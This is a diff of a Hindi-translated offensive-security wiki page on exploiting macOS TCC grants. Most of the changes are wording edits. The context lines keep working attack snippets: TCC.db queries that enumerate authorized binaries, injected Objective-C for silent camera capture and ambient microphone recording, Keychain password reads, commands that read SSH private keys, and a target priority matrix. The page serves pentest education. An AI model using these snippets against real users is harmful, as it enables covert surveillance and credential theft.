@@ -4,10 +4,10 @@
 
 ## Overview
 
-macOS TCC (Transparency, Consent, and Control) sensitive user data तक access को सुरक्षित रखता है। जब कोई attacker **ऐसे binary को compromise करता है जिसे पहले से TCC grants प्राप्त हैं**, तो उसे वे permissions भी विरासत में मिल जाती हैं। यह पेज data-theft से संबंधित प्रत्येक TCC permission की exploitation potential को document करता है।<sup>[[2]](#references)</sup>
+macOS TCC (Transparency, Consent, and Control) संवेदनशील user data तक access को सुरक्षित करता है। जब कोई attacker **ऐसे binary को compromise करता है जिसे पहले से TCC grants प्राप्त हैं**, तो उसे वे permissions विरासत में मिल जाती हैं। यह page data-theft से संबंधित प्रत्येक TCC permission की exploitation potential को document करता है।<sup>[[2]](#references)</sup>
 
 > [!WARNING]
-> TCC-granted binary में code injection (DYLD injection, dylib hijacking, या task port के माध्यम से) **उसकी सभी TCC permissions को चुपचाप विरासत में प्राप्त कर लेता है**। जब वही process protected data को पढ़ता है, तो कोई अतिरिक्त prompt या verification नहीं होता।
+> TCC-granted binary में code injection (DYLD injection, dylib hijacking या task port के माध्यम से) **उसकी सभी TCC permissions को बिना किसी अतिरिक्त सूचना के विरासत में ले लेता है**। जब वही process protected data को read करता है, तो कोई additional prompt या verification नहीं होता।<sup>[[4]](#references)</sup>
 
 ---
 
@@ -15,7 +15,7 @@ macOS TCC (Transparency, Consent, and Control) sensitive user data तक access
 
 ### The Prize
 
-macOS Keychain निम्नलिखित data store करता है:
+macOS Keychain निम्नलिखित को store करता है:
 - **Wi-Fi passwords** — सभी saved wireless network credentials
 - **Website passwords** — Safari, Chrome (जब Keychain का उपयोग किया जाता है), और अन्य browser passwords
 - **Application passwords** — email accounts, VPN credentials, development tokens
@@ -24,7 +24,7 @@ macOS Keychain निम्नलिखित data store करता है:
 
 ### Entitlement: `keychain-access-groups`
 
-Keychain items को **access groups** में व्यवस्थित किया जाता है। किसी application का `keychain-access-groups` entitlement उन groups की सूची देता है जिन तक वह access कर सकता है:<sup>[[1]](#references)</sup>
+Keychain items को **access groups** में organize किया जाता है। किसी application का `keychain-access-groups` entitlement उन groups की सूची देता है, जिन्हें वह access कर सकता है:<sup>[[1]](#references)</sup>
 ```xml
 <key>keychain-access-groups</key>
 <array>
@@ -85,13 +85,13 @@ NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8Stri
 
 ### Exploitation
 
-Camera TCC grant (via `kTCCServiceCamera` या `com.apple.security.device.camera` entitlement) वाला binary photos और video capture कर सकता है:
+Camera TCC grant वाली binary (via `kTCCServiceCamera` या `com.apple.security.device.camera` entitlement) photos और video capture कर सकती है:
 ```bash
 # Find camera-authorized binaries
 sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
 "SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
 ```
-### साइलेंट कैप्चर
+### Silent Capture
 ```objc
 // Injected into a camera-entitled process
 #import <AVFoundation/AVFoundation.h>
@@ -125,7 +125,7 @@ fromConnection:(AVCaptureConnection *)connection {
 @end
 ```
 > [!TIP]
-> **macOS Sonoma** से शुरू करके, menu bar में camera indicator स्थायी रहता है और इसे programmatically छिपाया नहीं जा सकता। **पुराने macOS versions** पर, एक संक्षिप्त capture से कोई स्पष्ट indicator दिखाई नहीं दे सकता।
+> **macOS Sonoma** से शुरू करते हुए, menu bar में camera indicator स्थायी होता है और इसे programmatically छिपाया नहीं जा सकता। **पुराने macOS versions** पर, थोड़े समय का capture कोई ध्यान देने योग्य indicator प्रदर्शित नहीं कर सकता।
 
 ---
 
@@ -133,13 +133,13 @@ fromConnection:(AVCaptureConnection *)connection {
 
 ### Exploitation
 
-Microphone access built-in mic, headset या connected audio input devices से आने वाला सारा audio capture करता है:
+Microphone access built-in mic, headset या connected audio input devices से आने वाले सभी audio को capture करता है:
 ```bash
 # Find mic-authorized binaries
 sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
 "SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
 ```
-### Attack: Ambient Recording
+### हमला: Ambient Recording
 ```objc
 // Injected into a mic-entitled process
 #import <AVFoundation/AVFoundation.h>
@@ -165,7 +165,7 @@ dispatch_get_main_queue(), ^{
 ```
 ---
 
-## Location Tracking (kTCCServiceLocation)
+## स्थान ट्रैकिंग (kTCCServiceLocation)
 
 ### Exploitation
 ```bash
@@ -207,9 +207,9 @@ loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
 
 | TCC Service | Framework | Data |
 |---|---|---|
-| `kTCCServiceAddressBook` | `Contacts.framework` | नाम, ईमेल, फ़ोन नंबर, पते |
-| `kTCCServiceCalendar` | `EventKit` | मीटिंग्स, प्रतिभागी, स्थान |
-| `kTCCServicePhotos` | `Photos.framework` | फ़ोटो, स्क्रीनशॉट, लोकेशन metadata |
+| `kTCCServiceAddressBook` | `Contacts.framework` | नाम, ईमेल, फ़ोन, पते |
+| `kTCCServiceCalendar` | `EventKit` | बैठकें, प्रतिभागी, स्थान |
+| `kTCCServicePhotos` | `Photos.framework` | फ़ोटो, स्क्रीनशॉट, स्थान मेटाडेटा |
 ```bash
 # Find authorized binaries for each service
 for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
@@ -240,11 +240,11 @@ usingBlock:^(CNContact *contact, BOOL *stop) {
 
 ### Entitlement: `com.apple.private.icloud-account-access`
 
-यह Entitlement `com.apple.iCloudHelper` XPC service के साथ communication की अनुमति देता है, जिससे इन तक access मिलता है:
-- **iCloud tokens** — user की Apple ID के authentication tokens
+यह entitlement `com.apple.iCloudHelper` XPC service के साथ communication की अनुमति देता है, जिससे इन चीज़ों तक access मिलता है:
+- **iCloud tokens** — user के Apple ID के authentication tokens
 - **iCloud Drive** — सभी devices से synced documents
 - **iCloud Keychain** — सभी Apple devices पर synced passwords
-- **Find My** — user के सभी Apple devices का location<sup>[[3]](#references)</sup>
+- **Find My** — user के सभी Apple devices की location<sup>[[3]](#references)</sup>
 ```bash
 # Find iCloud-entitled binaries
 sqlite3 /tmp/executables.db "
@@ -253,7 +253,7 @@ WHERE iCloudAccs = 1
 ORDER BY privileged DESC;"
 ```
 > [!CAUTION]
-> किसी iCloud-entitled binary को Compromise करने से attack **एक single device से पूरे Apple ecosystem** तक फैल जाता है: अन्य Macs, iPhones, iPads और Apple Watch। iCloud Keychain sync का अर्थ है कि सभी devices के passwords accessible होते हैं।
+> iCloud-entitled binary से समझौता करना हमले को **एकल डिवाइस से पूरे Apple ecosystem तक** विस्तारित कर देता है: अन्य Macs, iPhones, iPads, Apple Watch। iCloud Keychain sync का अर्थ है कि सभी डिवाइसों के passwords accessible हैं।
 
 ---
 
@@ -261,7 +261,7 @@ ORDER BY privileged DESC;"
 
 ### सबसे शक्तिशाली TCC Permission
 
-Full Disk Access system की **हर file** को read करने की capability देता है, जिसमें शामिल हैं:
+Full Disk Access सिस्टम की **हर file** को read करने की capability देता है, जिसमें शामिल हैं:
 - अन्य apps का data (Messages, Mail, Safari history)
 - TCC databases (अन्य सभी permissions का खुलासा)
 - SSH keys और configuration
@@ -282,7 +282,7 @@ cat ~/.ssh/id_rsa                           # SSH private key
 
 ## Exploitation Priority Matrix
 
-Injectable TCC-granted binaries का assessment करते समय, data value के आधार पर priority तय करें:
+Injectable TCC-granted binaries का assessment करते समय data value के आधार पर प्राथमिकता दें:
 
 | Priority | TCC Permission | Why |
 |---|---|---|
@@ -322,11 +322,10 @@ echo -e "\n[*] iCloud-entitled binaries:"
 sqlite3 /tmp/executables.db "
 SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
 ```
-## संदर्भ
+## References
 
 - [1] [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
 - [2] [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
-- [3] [OBTS v5.0 — "आपके Mac पर होने वाली बातें Apple के iCloud पर ही रहती हैं?!" (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)
+- [3] [OBTS v5.0 — "आपके Mac पर होने वाली बातें, क्या Apple के iCloud पर रहती हैं?!" (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)
 - [4] [Objective-See — TCC Exploitation](https://objective-see.org/blog/blog_0x4C.html)
-
 {{#include ../../../../banners/hacktricks-training.md}}
